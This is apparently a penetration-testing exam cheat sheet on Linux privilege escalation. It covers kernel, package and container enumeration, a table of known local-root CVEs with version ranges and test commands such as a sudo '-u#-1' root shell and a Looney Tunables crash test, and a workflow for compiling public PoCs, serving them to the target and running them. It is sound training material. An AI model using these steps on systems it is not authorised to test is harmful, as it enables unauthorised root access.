# Kernel and container checks

## Kernel / package version
Use after sudo/files/groups/shares are exhausted.

```bash
uname -a
uname -r
cat /etc/os-release
dpkg-query -W 2>/dev/null
rpm -qa 2>/dev/null
sudo -V | head -1
```
- Match exact package build, config, architecture and patches, not only the version string (backports).

## Capabilities / container
```bash
getcap -r / 2>/dev/null
getpcaps $$ 2>/dev/null
lsns
cat /proc/1/cgroup
test -f /.dockerenv && echo docker
ls -lah /var/run/docker.sock /run/containerd/containerd.sock 2>/dev/null
```
- Container root ≠ host root.

## Known CVE patterns
Last resort after sudo, files, groups and shares. Match the **exact** package/kernel build, not only the version string: distros backport fixes. Kernel exploits can crash the box (a revert costs you one of 24): read the PoC and keep the exploit for the end.

```bash
uname -r; cat /etc/os-release
sudo -V | head -1
pkexec --version 2>/dev/null
ldd --version | head -1
./linux-exploit-suggester.sh
```
- Suggester output matches version strings and ignores patch state: verify each lead below.

| Check | Affected | Test / lead |
| --- | --- | --- |
| **PwnKit** (CVE-2021-4034) | polkit `pkexec` < 0.121 (backports vary); SUID `pkexec` present | `ls -l $(which pkexec)`; `pkexec --version`; PoC: `searchsploit pwnkit` / public C PoC |
| **Baron Samedit** (CVE-2021-3156) | sudo 1.8.2–1.8.31p2, 1.9.0–1.9.5p1 | `sudoedit -s /` → error starting `sudoedit:` = vulnerable, `usage:` = patched |
| **sudo `-u#-1`** (CVE-2019-14287) | sudo < 1.8.28 with a `(ALL, !root)` rule | `sudo -u#-1 /bin/bash` |
| **sudoedit `EDITOR`** (CVE-2023-22809) | sudo 1.8.0–1.9.12p1 with a `sudoedit` rule | [sudo](sudo.md#sudo-version-bugs) |
| **Dirty Pipe** (CVE-2022-0847) | kernel 5.8 up to 5.16.10 / 5.15.24 / 5.10.101 | `uname -r`; PoC overwrites a file you can read (e.g. SUID binary or `/etc/passwd`); `searchsploit dirty pipe` |
| **Dirty COW** (CVE-2016-5195) | kernel 2.6.22 up to 4.8.3 (4.7.9 / 4.4.26 fixed) | `uname -r`; `searchsploit dirty cow` (several variants) |
| **Looney Tunables** (CVE-2023-4911) | glibc 2.34 up to the Oct 2023 fixes (Ubuntu 22.04/23.04, Debian 12, Fedora 37/38) | `ldd --version`; test: `env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" "Z=$(printf '%08192x' 1)" /usr/bin/su --help` → segfault = vulnerable |
| **OverlayFS Ubuntu** (CVE-2021-3493, CVE-2023-2640/32629) | Ubuntu kernels with unprivileged overlayfs | `uname -r` + `cat /etc/os-release`; `searchsploit overlayfs` |
| **nf_tables** (CVE-2024-1086 and others) | kernels with `nf_tables` + unprivileged user namespaces | PoC README lists exact range; `sysctl kernel.unprivileged_userns_clone` (Debian) / `user.max_user_namespaces` |
| Anything else | Exact kernel/package | `searchsploit linux kernel <VER> priv`; don't run mismatched PoCs |

Workflow:
```bash
searchsploit -m <EDB-ID>
less <FILE>                       # read the PoC: offsets, hardcoded paths, targets
gcc -static <FILE>.c -o exp       # on Kali, same arch as the target ('uname -m')
python3 -m http.server 8000       # then fetch on target
chmod +x exp && ./exp
```
- Build on Kali with `-static` when the target lacks libs/compiler; compile on the target (`gcc`) when it has one and the PoC needs its headers. [Compiling](../foothold/public-exploits.md#compiling-exploits)
- Check after: `id`; Dirty-Pipe/Dirty-COW style PoCs modify files: note the changed file and restore it (many PoCs save a backup).
- Modified PoC in the report: URL, your change and why ([exam checklist](../documentation/exam-checklist.md)).
